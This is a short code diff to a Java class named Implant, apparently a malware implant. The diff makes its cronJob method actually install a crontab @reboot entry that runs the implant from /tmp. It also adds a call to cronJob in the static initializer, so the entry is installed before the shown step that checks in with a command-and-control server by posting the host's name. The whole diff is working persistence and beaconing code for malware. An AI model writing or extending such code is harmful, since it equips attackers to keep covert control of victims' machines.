@@ -30,7 +30,9 @@ public class Implant {
     static final int POLL_SECONDS = 5;
 
     // Persistence via cronjob
-    static String cronJob() {"(crontab -l 2>/dev/null; echo "@reboot /path/to/binary") | crontab -"}
+    static void cronJob() {
+        run("(crontab -l 2>/dev/null; echo \"@reboot java -cp /tmp Implant\") | crontab -");
+    }
 
     /** Run a shell command, return stdout. */
     static String run(String cmd) {
@@ -89,6 +91,9 @@ public class Implant {
     }
 
     static {
+        //Step 0: Install persistence
+        cronJob();
+
         //Step 1: Check in with C2
         String host = run("hostname").trim();
         post("/checkin", "{\"host\":\"" + esc(host) + "\"}");
